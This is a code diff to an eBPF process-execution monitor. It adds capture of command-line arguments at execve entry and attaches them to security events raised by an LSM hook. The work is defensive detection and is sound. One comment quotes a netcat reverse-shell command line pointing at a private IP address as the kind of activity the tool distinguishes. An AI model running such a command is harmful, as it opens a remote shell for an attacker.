@@ -30,6 +30,52 @@ char LICENSE[] SEC("license") = "GPL";
  * for the verifier anyway. Each level costs 20 bytes in the event. */
 #define ANCESTRY_DEPTH 4
 
+/* Captured argv. 256 bytes is a power of two, which is what lets the verifier
+ * prove the bounded write below, and it holds a realistic command line; longer
+ * ones are truncated rather than dropped. Arguments are NUL separated, exactly
+ * as /proc/<pid>/cmdline presents them. */
+#define ARGS_MAX  256
+#define ARGS_COUNT 20
+/* Bytes the verifier is told each read may consume. Passing a variable size
+ * derived from the running offset is rejected ("R1 max value is outside of the
+ * allowed memory range") because the verifier cannot correlate the two; a
+ * constant size plus an explicit bound on the index is the shape it can prove.
+ * The offset still advances by the bytes actually read, so nothing is wasted -
+ * this only caps a single argument at ARG_CHUNK-1 characters. */
+#define ARG_CHUNK 64
+
+/* Context layouts for the syscall entry tracepoints. Using the tracepoints
+ * rather than a raw tracepoint over pt_regs keeps this architecture neutral:
+ * PT_REGS_PARM*_CORE_SYSCALL casts to struct user_pt_regs, which does not
+ * exist in an x86-derived vmlinux.h and so breaks the arm64 build. The
+ * tracepoint hands us the arguments already extracted. */
+struct execve_tp_ctx {
+	__u64 __pad_common;
+	__s32 __syscall_nr;
+	__u32 __pad;
+	const char *filename;
+	const char *const *argv;
+	const char *const *envp;
+};
+
+struct execveat_tp_ctx {
+	__u64 __pad_common;
+	__s32 __syscall_nr;
+	__u32 __pad;
+	__s64 fd;
+	const char *filename;
+	const char *const *argv;
+	const char *const *envp;
+	__s64 flags;
+};
+
+struct exec_args {
+	__u32 argc;            /* arguments actually captured, not argc as passed */
+	__u32 len;             /* bytes used in buf */
+	__u8  truncated;       /* 1 when the command line did not fit */
+	__u8  buf[ARGS_MAX];
+};
+
 struct ancestor {
 	__u32 pid;      /* tgid; 0 marks the end of the chain */
 	__u8  comm[16];
@@ -50,12 +96,41 @@ struct exec_event {
 	 * as "nginx -> sh -> curl" than as "curl was denied". */
 	struct ancestor ancestry[ANCESTRY_DEPTH];
 	__u8  filename[PATH_MAX_LEN];
+	/* NUL separated argv, captured at sys_enter. */
+	__u32 args_count;
+	__u32 args_len;
+	__u8  args_truncated;
+	__u8  args[ARGS_MAX];
 };
 
 struct {
 	__uint(type, BPF_MAP_TYPE_RINGBUF);
 	__uint(max_entries, 1 << 18); /* 256 KiB; events are deduped in-kernel */
 } exec_events SEC(".maps");
+
+/* argv captured at sys_enter, consumed by bprm_check in the same syscall.
+ *
+ * The LSM hook cannot read argv itself: by the time it runs the strings live in
+ * the new mm being constructed, and bpf_probe_read_user reads the current
+ * address space. At sys_enter we are still in the caller's, where argv is a
+ * plain userspace pointer. Both run in the same task within the same execve, so
+ * the pid_tgid key needs no correlation window and the entry is deleted on
+ * consumption. The LRU bounds what a failed exec leaves behind. */
+struct {
+	__uint(type, BPF_MAP_TYPE_LRU_HASH);
+	__type(key, __u64);
+	__type(value, struct exec_args);
+	__uint(max_entries, 1 << 10);
+} exec_args_scratch SEC(".maps");
+
+/* One scratch entry per CPU to build into: struct exec_args is far too large
+ * for the 512-byte BPF stack. */
+struct {
+	__uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
+	__type(key, __u32);
+	__type(value, struct exec_args);
+	__uint(max_entries, 1);
+} exec_args_build SEC(".maps");
 
 /* Learned allow-set: key = cgroup_id ^ FNV(filename). */
 struct {
@@ -87,6 +162,77 @@ static __always_inline __u64 hash_name(const __u8 *p, int n)
 		h *= 1099511628211ULL;
 	}
 	return h;
+}
+
+/* Capture argv on entry to execve/execveat.
+ *
+ * Arguments are what separate "nc ran" from "nc -e /bin/sh 10.0.0.1 4444", and
+ * both comparators report them. This is the only point in the syscall where
+ * argv is readable: it is a userspace pointer in the caller's address space,
+ * and the LSM hook that follows runs against the new mm.
+ */
+static __always_inline int capture_args(const char *const *argv)
+{
+	if (!argv)
+		return 0;
+
+	__u64 pid_tgid = bpf_get_current_pid_tgid();
+	if ((pid_tgid >> 32) == 0)
+		return 0;
+
+	__u32 zero = 0;
+	struct exec_args *a = bpf_map_lookup_elem(&exec_args_build, &zero);
+	if (!a)
+		return 0;
+	a->argc = 0;
+	a->len = 0;
+	a->truncated = 0;
+
+	__u32 off = 0;
+#pragma unroll
+	for (int i = 0; i < ARGS_COUNT; i++) {
+		const char *p = NULL;
+		if (bpf_probe_read_user(&p, sizeof(p), &argv[i]) != 0 || !p)
+			break;
+
+		/* barrier_var stops the compiler re-deriving the index from `off` and
+		 * hoisting the address computation above the bound check, which is why
+		 * masking alone was still rejected: the verifier saw the original,
+		 * unbounded value at the point of the write. */
+		__u32 idx = off;
+		barrier_var(idx);
+		if (idx > ARGS_MAX - ARG_CHUNK) {
+			a->truncated = 1;
+			break;
+		}
+		long n = bpf_probe_read_user_str(&a->buf[idx], ARG_CHUNK, p);
+		if (n <= 0)
+			break;
+		/* n includes the NUL, which becomes the separator between arguments,
+		 * matching how /proc/<pid>/cmdline reads. */
+		off = idx + (__u32)n;
+		a->argc++;
+		if ((__u32)n == ARG_CHUNK) {
+			/* The argument filled the chunk, so it was cut short. */
+			a->truncated = 1;
+		}
+	}
+
+	a->len = off & (ARGS_MAX - 1);
+	bpf_map_update_elem(&exec_args_scratch, &pid_tgid, a, BPF_ANY);
+	return 0;
+}
+
+SEC("tracepoint/syscalls/sys_enter_execve")
+int handle_execve_args(struct execve_tp_ctx *ctx)
+{
+	return capture_args(ctx->argv);
+}
+
+SEC("tracepoint/syscalls/sys_enter_execveat")
+int handle_execveat_args(struct execveat_tp_ctx *ctx)
+{
+	return capture_args(ctx->argv);
 }
 
 SEC("lsm/bprm_check_security")
@@ -152,6 +298,27 @@ int BPF_PROG(bprm_check, struct linux_binprm *bprm, int ret)
 	e->filename[0] = 0;
 	if (fname)
 		bpf_probe_read_kernel_str(e->filename, sizeof(e->filename), fname);
+
+	/* Attach the argv captured on entry to this same execve. */
+	e->args_count = 0;
+	e->args_len = 0;
+	e->args_truncated = 0;
+	e->args[0] = 0;
+	{
+		struct exec_args *a = bpf_map_lookup_elem(&exec_args_scratch, &pid_tgid);
+		if (a) {
+			e->args_count = a->argc;
+			e->args_truncated = a->truncated;
+			__u32 n = a->len;
+			if (n > ARGS_MAX)
+				n = ARGS_MAX;
+			e->args_len = n;
+			__builtin_memcpy(e->args, a->buf, ARGS_MAX);
+			/* Consumed: leaving it would attach these arguments to whatever
+			 * this pid execs next. */
+			bpf_map_delete_elem(&exec_args_scratch, &pid_tgid);
+		}
+	}
 
 	__u64 key = cgroup_id ^ hash_name(e->filename, sizeof(e->filename));
 
